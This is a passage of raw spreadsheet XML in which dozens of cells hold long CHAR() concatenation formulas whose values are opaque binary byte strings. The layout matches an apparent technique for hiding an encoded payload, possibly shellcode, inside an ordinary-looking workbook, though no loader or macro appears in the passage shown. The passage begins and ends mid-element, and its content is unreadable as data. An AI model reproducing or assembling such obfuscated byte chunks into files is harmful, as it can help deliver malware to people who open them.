;CHAR(134)&amp;CHAR(201)&amp;CHAR(29)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(138)&amp;CHAR(75)&amp;CHAR(29)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(115)&amp;CHAR(213)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(92)&amp;CHAR(88)&amp;CHAR(198)&amp;CHAR(142)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(10)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(102)&amp;CHAR(53)&amp;CHAR(14)&amp;CHAR(136)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(213)&amp;CHAR(113)&amp;CHAR(23)&amp;CHAR(142)&amp;CHAR(207)&amp;CHAR(45)&amp;CHAR(250)&amp;CHAR(137)&amp;CHAR(218)&amp;CHAR(48)&amp;CHAR(14)&amp;CHAR(119)&amp;CHAR(7)&amp;CHAR(65)&amp;CHAR(142)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(197)&amp;CHAR(128)&amp;CHAR(204)&amp;CHAR(126)&amp;CHAR(246)&amp;CHAR(5)&amp;CHAR(189)&amp;CHAR(29)&amp;CHAR(14)&amp;CHAR(180)&amp;CHAR(203)&amp;CHAR(44)&amp;CHAR(199)&amp;CHAR(83)&amp;CHAR(208)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(22)&amp;CHAR(89)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(33)&amp;CHAR(35)&amp;CHAR(54)&amp;CHAR(193)&amp;CHAR(84)&amp;CHAR(137)&amp;CHAR(111)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(91)&amp;CHAR(82)&amp;CHAR(56)&amp;CHAR(244)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(41)&amp;CHAR(48)&amp;CHAR(240)&amp;CHAR(133)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(18)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(33)&amp;CHAR(128)&amp;CHAR(14)&amp;CHAR(12)&amp;CHAR(134)&amp;CHAR(219)&amp;CHAR(101)</f>
        <v>ˆ_x000B_ú\_x000D_€O%_x001D_UŽ_x000B_ù]_x000D_ù”µ_x0005__x0005_	„D_x0005__x0012__x0011_‹_x0006_B_x0008__x0007__x0005__x0003_TPUâû	
_x0006_É_x000D_l	Ê_x0005__x0014_QVôPJTK\YŠÃ
Î˜E!_x000E_Í_x0002__x0003__x0005__x0003__x0005_2ÁÀ_x0013__x0003_ŽI!_x000F_ E)_x000D_ÆˆB(_x0001_Ÿõy!_x000D_Êâ_x0002__x0004__x0002__x0012_I…ê_x0002_ÉRŽï`¤6
_x0003__x000B_9ÏT†A_x0008_‚z	ÿ$€Âs)ô`_x0019_ý|_x0013_ùx_x0003_þp_x000E_Zýw_x000D_ë‰ìþýˆ5†É_x001D_€ÃŠK_x001D_€ÃsÕŽÇ\XÆŽM.
R‰f5_x000E_ˆ_x0011_ŽÕq_x0017_ŽÏ-ú‰Ú0_x000E_w_x0007_AŽ_x0005__x000C_Å€Ì~ö_x0005_½_x001D__x000E_´Ë,ÇSÐ‚é_x0016_Y‰^!#6ÁT‰o'-[R8ôˆI!)0ð…q"_x0012_ŽI!!€_x000E__x000C_†Ûe</v>
      </c>
      <c r="C118" t="str">
        <f>CHAR(119)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(72)&amp;CHAR(43)&amp;CHAR(180)&amp;CHAR(110)&amp;CHAR(84)&amp;CHAR(253)</f>
        <v>wýô6H+´nTý</v>
      </c>
    </row>
    <row r="119" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B119" t="str">
        <f>CHAR(23)&amp;CHAR(129)&amp;CHAR(255)&amp;CHAR(74)&amp;CHAR(115)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(72)&amp;CHAR(57)&amp;CHAR(18)&amp;CHAR(77)&amp;CHAR(67)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(46)&amp;CHAR(230)&amp;CHAR(86)&amp;CHAR(110)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(46)&amp;CHAR(211)&amp;CHAR(137)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(90)&amp;CHAR(8)&amp;CHAR(226)&amp;CHAR(107)&amp;CHAR(2)&amp;CHAR(95)&amp;CHAR(239)&amp;CHAR(251)&amp;CHAR(12)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(196)&amp;CHAR(4)&amp;CHAR(133)&amp;CHAR(128)&amp;CHAR(250)&amp;CHAR(13)&amp;CHAR(115)&amp;CHAR(35)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(29)&amp;CHAR(88)&amp;CHAR(91)&amp;CHAR(233)&amp;CHAR(83)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(108)&amp;CHAR(28)&amp;CHAR(54)&amp;CHAR(222)&amp;CHAR(49)&amp;CHAR(239)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(46)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(82)&amp;CHAR(250)&amp;CHAR(197)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(137)&amp;CHAR(195)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(33)&amp;CHAR(42)&amp;CHAR(129)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(26)&amp;CHAR(199)&amp;CHAR(226)&amp;CHAR(14)&amp;CHAR(71)&amp;CHAR(110)&amp;CHAR(25)&amp;CHAR(131)&amp;CHAR(65)&amp;CHAR(48)&amp;CHAR(32)&amp;CHAR(90)&amp;CHAR(130)&amp;CHAR(114)&amp;CHAR(46)&amp;CHAR(27)&amp;CHAR(150)&amp;CHAR(254)&amp;CHAR(18)&amp;CHAR(124)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(128)&amp;CHAR(87)&amp;CHAR(37)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(234)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(48)&amp;CHAR(219)&amp;CHAR(54)&amp;CHAR(231)&amp;CHAR(54)&amp;CHAR(244)&amp;CHAR(128)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(41)&amp;CHAR(128)&amp;CHAR(245)&amp;CHAR(9)&amp;CHAR(136)&amp;CHAR(98)&amp;CHAR(249)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(91)&amp;CHAR(130)&amp;CHAR(223)&amp;CHAR(137)&amp;CHAR(199)&amp;CHAR(95)&amp;CHAR(73)&amp;CHAR(146)&amp;CHAR(194)&amp;CHAR(22)&amp;CHAR(196)&amp;CHAR(137)&amp;CHAR(235)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(87)&amp;CHAR(47)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(91)&amp;CHAR(138)&amp;CHAR(112)&amp;CHAR(45)&amp;CHAR(42)&amp;CHAR(54)&amp;CHAR(207)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(34)&amp;CHAR(26)&amp;CHAR(174)&amp;CHAR(176)&amp;CHAR(164)&amp;CHAR(167)&amp;CHAR(130)&amp;CHAR(75)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(152)&amp;CHAR(117)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(110)&amp;CHAR(38)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(121)&amp;CHAR(37)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(202)&amp;CHAR(195)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(113)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(5)&amp;CHAR(206)&amp;CHAR(196)&amp;CHAR(200)&amp;CHAR(10)&amp;CHAR(54)&amp;CHAR(194)&amp;CHAR(6)&amp;CHAR(254)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(7)&amp;CHAR(49)&amp;CHAR(225)&amp;CHAR(208)&amp;CHAR(193)&amp;CHAR(1)&amp;CHAR(52)&amp;CHAR(218)&amp;CHAR(142)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(44)&amp;CHAR(54)&amp;CHAR(248)&amp;CHAR(129)&amp;CHAR(234)&amp;CHAR(72)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(25)&amp;CHAR(127)&amp;CHAR(215)&amp;CHAR(91)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(151)&amp;CHAR(192)&amp;CHAR(21)&amp;CHAR(200)&amp;CHAR(141)</f>
        <v>_x0017_ÿJs	‹H9_x0012_MC‚N".æVn_x0019_R.Ó‰q/_x0012_Z_x0008_âk_x0002__ïû_x000C__x0013__x0001_†Æ_x0006_Ä_x0004_…€ú_x000D_s#VŽA)_x001D_X[éS_x0005__x0005__x0003_l_x001C_6Þ1ïˆA-.h_x0004_RúÅ_x0007__x0002__x0007_‰Ã_x001D_ˆ@!*w/_x001A_Çâ_x000E_Gn_x0019_ƒA0 Z‚r._x001B_–þ_x0012_|_x0012_S€W%_x001D_QZê#_x0005__x0003__x0005_‚Å_x000E_0Û6ç6ô€E))€õ	ˆbùýúZ[‚ß‰Ç_I’Â_x0016_Ä‰ë_x0015_ˆ@!_x001E_W/_x0016_UW[Šp-*6ÏSˆw"_x001A_®°¤§‚K"_x0019_˜u!_x001E_n&amp;_x001D_ˆy%_x0011_‹O'-†ËÊÃ	†q!+_x0005_ÎÄÈ
6Â_x0006_þËÀ_x0007_1áÐÁ_x0001_4ÚŽi',6øêH‰ý_x0019_×[WW^—À_x0015_È</v>
      </c>
      <c r="C119" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(231)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6¨£0çÒÕô6</v>
      </c>
    </row>
    <row r="120" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B120" t="str">
        <f>CHAR(94)&amp;CHAR(47)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(238)&amp;CHAR(29)&amp;CHAR(84)&amp;CHAR(141)&amp;CHAR(81)&amp;CHAR(55)&amp;CHAR(37)&amp;CHAR(128)&amp;CHAR(208)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(86)&amp;CHAR(54)&amp;CHAR(224)&amp;CHAR(64)&amp;CHAR(93)&amp;CHAR(134)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(46)&amp;CHAR(237)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(64)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(139)&amp;CHAR(105)&amp;CHAR(33)&amp;CHAR(49)&amp;CHAR(130)&amp;CHAR(250)&amp;CHAR(143)&amp;CHAR(120)&amp;CHAR(38)&amp;CHAR(6)&amp;CHAR(34)&amp;CHAR(207)&amp;CHAR(167)&amp;CHAR(162)&amp;CHAR(175)&amp;CHAR(162)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(32)&amp;CHAR(45)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(58)&amp;CHAR(78)&amp;CHAR(138)&amp;CHAR(22)&amp;CHAR(76)&amp;CHAR(130)&amp;CHAR(253)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(246)&amp;CHAR(159)&amp;CHAR(112)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(141)&amp;CHAR(78)&amp;CHAR(47)&amp;CHAR(9)&amp;CHAR(138)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(55)&amp;CHAR(21)&amp;CHAR(194)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(50)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(1)&amp;CHAR(197)&amp;CHAR(194)&amp;CHAR(194)&amp;CHAR(8)&amp;CHAR(54)&amp;CHAR(242)&amp;CHAR(202)&amp;CHAR(199)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(245)&amp;CHAR(194)&amp;CHAR(199)&amp;CHAR(28)&amp;CHAR(6)&amp;CHAR(193)&amp;CHAR(1)&amp;CHAR(203)&amp;CHAR(196)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(203)&amp;CHAR(196)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(234)&amp;CHAR(34)&amp;CHAR(247)&amp;CHAR(195)&amp;CHAR(199)&amp;CHAR(26)&amp;CHAR(132)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(52)&amp;CHAR(4)&amp;CHAR(115)&amp;CHAR(221)&amp;CHAR(136)&amp;CHAR(103)&amp;CHAR(46)&amp;CHAR(46)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(16)&amp;CHAR(58)&amp;CHAR(195)&amp;CHAR(140)&amp;CHAR(96)&amp;CHAR(32)&amp;CHAR(37)&amp;CHAR(130)&amp;CHAR(122)&amp;CHAR(46)&amp;CHAR(19)&amp;CHAR(156)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(66)&amp;CHAR(128)&amp;CHAR(19)&amp;CHAR(48)&amp;CHAR(65)&amp;CHAR(142)&amp;CHAR(30)&amp;CHAR(67)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(7)&amp;CHAR(119)&amp;CHAR(243)&amp;CHAR(138)&amp;CHAR(110)&amp;CHAR(39)&amp;CHAR(55)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(111)&amp;CHAR(27)&amp;CHAR(83)&amp;CHAR(58)&amp;CHAR(221)&amp;CHAR(10)&amp;CHAR(66)&amp;CHAR(203)&amp;CHAR(131)&amp;CHAR(197)&amp;CHAR(123)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(121)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(249)&amp;CHAR(41)&amp;CHAR(255)&amp;CHAR(137)&amp;CHAR(251)&amp;CHAR(155)&amp;CHAR(2)&amp;CHAR(53)&amp;CHAR(55)&amp;CHAR(12)&amp;CHAR(65)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(5)&amp;CHAR(112)&amp;CHAR(243)&amp;CHAR(129)&amp;CHAR(111)&amp;CHAR(47)&amp;CHAR(62)&amp;CHAR(45)&amp;CHAR(211)&amp;CHAR(14)&amp;CHAR(216)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(46)&amp;CHAR(21)&amp;CHAR(148)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(14)&amp;CHAR(67)&amp;CHAR(134)&amp;CHAR(17)&amp;CHAR(40)&amp;CHAR(135)&amp;CHAR(201)&amp;CHAR(120)&amp;CHAR(245)&amp;CHAR(134)&amp;CHAR(87)&amp;CHAR(37)&amp;CHAR(41)&amp;CHAR(135)&amp;CHAR(216)&amp;CHAR(13)&amp;CHAR(135)&amp;CHAR(55)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(254)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(88)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(17)</f>
        <v>^/_x0005_‚î_x001D_TQ7%€Ð_x0005_†ê_x0005__x0003__x0005_ŠE&amp;#V6à@]†I_x0002_.íT@!_x0016_‹i!1‚úx&amp;_x0006_"Ï§¢¯¢Žw -_x000E_:NŠ_x0016_L‚ý_x000D_xöŸp!+N/	Š~-_x001F_A7_x0015_ÂF.2_x0012__x0005__x0003__x0005__x0002_Î_x0001_ÅÂÂ_x0008_6òÊÇ_x0005_6õÂÇ_x001C__x0006_Á_x0001_ËÄÂ_x000E_ËÄ	1ê"÷ÃÇ_x001A_„i'4_x0004_sÝˆg..‹A%_x0010_:ÃŒ` %‚z._x0013_œE&amp;_x0015_ŒB€_x0013_0AŽ_x001E_Cü_x0007_wóŠn'7ŽÇo_x001B_S:Ý
BËƒÅ{_x001F_y!_x0011_‚ù)ÿ‰û›_x0002_57_x000C_A†î_x0005_póo/&gt;-Ó_x000E_ØE._x0015_”_x0005__x0004_~_x000E_C†_x0011_(‡Éxõ†W%)‡Ø_x000D_‡7üúþ^\^X†É_x0011_</v>
      </c>
      <c r="C120" t="str">
        <f>CHAR(205)&amp;CHAR(163)&amp;CHAR(58)&amp;CHAR(42)&amp;CHAR(223)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)</f>
        <v>Í£:*ßüô6¨£</v>
      </c>
    </row>
    <row r="121" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B121" t="str">
        <f>CHAR(200)&amp;CHAR(128)&amp;CHAR(85)&amp;CHAR(41)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(8)&amp;CHAR(83)&amp;CHAR(141)&amp;CHAR(242)&amp;CHAR(128)&amp;CHAR(215)&amp;CHAR(113)&amp;CHAR(26)&amp;CHAR(93)&amp;CHAR(137)&amp;CHAR(120)&amp;CHAR(38)&amp;CHAR(2)&amp;CHAR(58)&amp;CHAR(254)&amp;CHAR(136)&amp;CHAR(11)&amp;CHAR(61)&amp;CHAR(143)&amp;CHAR(11)&amp;CHAR(69)&amp;CHAR(135)&amp;CHAR(239)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(246)&amp;CHAR(84)&amp;CHAR(84)&amp;CHAR(197)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(37)&amp;CHAR(12)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(24)&amp;CHAR(83)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(34)&amp;CHAR(2)&amp;CHAR(248)&amp;CHAR(191)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(15)&amp;CHAR(89)&amp;CHAR(206)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(153)&amp;CHAR(5)</f>
        <v>È€U)	ŽG"_x0008_Sò€×q_x001A_]‰x&amp;_x0002_:þˆ_x000B_=_x000B_E‡ï_x0007_öTTÅˆI%_x000C_‚F!_x0018_SŽw"_x0002_ø¿ŠF-_x000F_YÎ_x0013__x0001__x0005__x0002_
_x0002__x0002__x0005__x0003__x0005__x0001__x0001__x0002__x0003__x0003__x0005__x000D__x0005__x000B__x000B__x0001__x000D__x0005_™_x0005_</v>
      </c>
      <c r="C121" t="str">
        <f>CHAR(48)&amp;CHAR(215)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(20)&amp;CHAR(236)&amp;CHAR(163)</f>
        <v>0×ÒÕô6Í_x0014_ì£</v>
      </c>
    </row>
    <row r="122" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B122" t="s">
        <v>0</v>
      </c>
      <c r="C122" t="str">
        <f>CHAR(146)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(50)&amp;CHAR(232)&amp;CHAR(195)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(181)</f>
        <v>’µ2èÃ»ë÷µ</v>
      </c>
    </row>
    <row r="123" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C123" t="str">
        <f>CHAR(241)&amp;CHAR(174)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(189)</f>
        <v>ñ®Íë»£|ý¼½</v>
      </c>
    </row>
    <row r="124" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C124" t="str">
        <f>CHAR(205)&amp;CHAR(166)&amp;CHAR(138)&amp;CHAR(34)&amp;CHAR(146)&amp;CHAR(177)&amp;CHAR(127)&amp;CHAR(50)&amp;CHAR(232)&amp;CHAR(195)</f>
        <v>Í¦Š"’±2èÃ</v>
      </c>
    </row>
    <row r="125" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C125" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(180)&amp;CHAR(117)&amp;CHAR(246)&amp;CHAR(213)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷´uöÕê»ë</v>
      </c>
    </row>
    <row r="126" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C126" t="str">
        <f>CHAR(186)&amp;CHAR(118)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(175)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)</f>
        <v>ºvôS…`¯Îßý</v>
      </c>
    </row>
    <row r="127" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C127" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(106)&amp;CHAR(121)&amp;CHAR(195)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(83)</f>
        <v>ô6…jyÃöýôS</v>
      </c>
    </row>
    <row r="128" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C128" t="str">
        <f>CHAR(133)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(106)</f>
        <v>…`·Îßýô6…j</v>
      </c>
    </row>
    <row r="129" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C129" t="str">
        <f>CHAR(122)&amp;CHAR(115)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(123)</f>
        <v>zs÷ýô~FâD{</v>
      </c>
    </row>
    <row r="130" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C130" t="str">
        <f>CHAR(223)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(223)&amp;CHAR(210)&amp;CHAR(213)</f>
        <v>ßüô6¨£0ßÒÕ</v>
      </c>
    </row>
    <row r="131" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C131" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(7)&amp;CHAR(181)&amp;CHAR(121)&amp;CHAR(35)</f>
        <v>ô6Í½òb_x0007_µy#</v>
      </c>
    </row>
    <row r="132" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C132" t="str">
        <f>CHAR(245)&amp;CHAR(233)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(249)&amp;CHAR(60)&amp;CHAR(207)&amp;CHAR(235)</f>
        <v>õé»ë¿pù&lt;Ïë</v>
      </c>
    </row>
    <row r="133" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C133" t="str">
        <f>CHAR(187)&amp;CHAR(3)&amp;CHAR(239)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(148)&amp;CHAR(81)&amp;CHAR(187)&amp;CHAR(232)</f>
        <v>»_x0003_ïýô6”Q»è</v>
      </c>
    </row>
    <row r="134" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C134" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(142)&amp;CHAR(205)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(8)&amp;CHAR(45)</f>
        <v>÷ýµŽÍ«»ë_x0008_-</v>
      </c>
    </row>
    <row r="135" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C135" t="str">
        <f>CHAR(188)&amp;CHAR(181)&amp;CHAR(9)&amp;CHAR(147)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(57)&amp;CHAR(140)&amp;CHAR(245)</f>
        <v>¼µ	“x£t9Œõ</v>
      </c>
    </row>
    <row r="136" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C136" t="str">
        <f>CHAR(133)&amp;CHAR(106)&amp;CHAR(87)&amp;CHAR(131)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(68)&amp;CHAR(183)</f>
        <v>…jWƒöýô~D·</v>
      </c>
    </row>
    <row r="137" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C137" t="str">
        <f>CHAR(159)&amp;CHAR(195)&amp;CHAR(191)&amp;CHAR(116)&amp;CHAR(152)&amp;CHAR(18)&amp;CHAR(253)&amp;CHAR(163)&amp;CHAR(50)&amp;CHAR(151)</f>
        <v>ŸÃ¿t˜_x0012_ý£2—</v>
      </c>
    </row>
    <row r="138" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C138" t="str">
        <f>CHAR(211)&amp;CHAR(197)&amp;CHAR(188)&amp;CHAR(191)&amp;CHAR(185)&amp;CHAR(207)&amp;CHAR(251)&amp;CHAR(167)&amp;CHAR(126)&amp;CHAR(153)</f>
        <v>ÓÅ¼¿¹Ïû§~™</v>
      </c>
    </row>
    <row r="139" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C139" t="str">
        <f>CHAR(208)&amp;CHAR(126)&amp;CHAR(129)&amp;CHAR(98)&amp;CHAR(215)&amp;CHAR(207)&amp;CHAR(167)&amp;CHAR(177)&amp;CHAR(125)&amp;CHAR(66)</f>
        <v>Ð~b×Ï§±}B</v>
      </c>
    </row>
    <row r="140" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C140" t="str">
        <f>CHAR(233)&amp;CHAR(179)&amp;CHAR(247)&amp;CHAR(98)&amp;CHAR(139)&amp;CHAR(217)&amp;CHAR(148)&amp;CHAR(83)&amp;CHAR(129)&amp;CHAR(96)</f>
        <v>é³÷b‹Ù”S`</v>
      </c>
    </row>
    <row r="141" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C141" t="str">
        <f>CHAR(167)&amp;CHAR(206)&amp;CHAR(151)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(128)&amp;CHAR(96)&amp;CHAR(224)&amp;CHAR(243)</f>
        <v>§Î—ýô6€`àó</v>
      </c>
    </row>
    <row r="142" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C142" t="str">
        <f>CHAR(186)&amp;CHAR(112)&amp;CHAR(175)&amp;CHAR(38)&amp;CHAR(128)&amp;CHAR(98)&amp;CHAR(100)&amp;CHAR(166)&amp;CHAR(124)&amp;CHAR(230)</f>
        <v>ºp¯&amp;€bd¦|æ</v>
      </c>
    </row>
    <row r="143" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C143" t="str">
        <f>CHAR(8)&amp;CHAR(127)&amp;CHAR(70)&amp;CHAR(144)&amp;CHAR(219)&amp;CHAR(163)&amp;CHAR(126)&amp;CHAR(51)&amp;CHAR(88)&amp;CHAR(178)</f>
        <v>_x0008_FÛ£~3X²</v>
      </c>
    </row>
    <row r="144" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C144" t="str">
        <f>CHAR(13)&amp;CHAR(159)&amp;CHAR(157)&amp;CHAR(97)&amp;CHAR(208)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(87)&amp;CHAR(177)&amp;CHAR(232)</f>
        <v>_x000D_ŸaÐ}_x0008_W±è</v>
      </c>
    </row>
    <row r="145" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C145" t="str">
        <f>CHAR(59)&amp;CHAR(7)&amp;CHAR(215)&amp;CHAR(197)&amp;CHAR(48)&amp;CHAR(67)&amp;CHAR(197)&amp;CHAR(163)&amp;CHAR(68)&amp;CHAR(44)</f>
        <v>;_x0007_×Å0CÅ£D,</v>
      </c>
    </row>
    <row r="146" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C146" t="str">
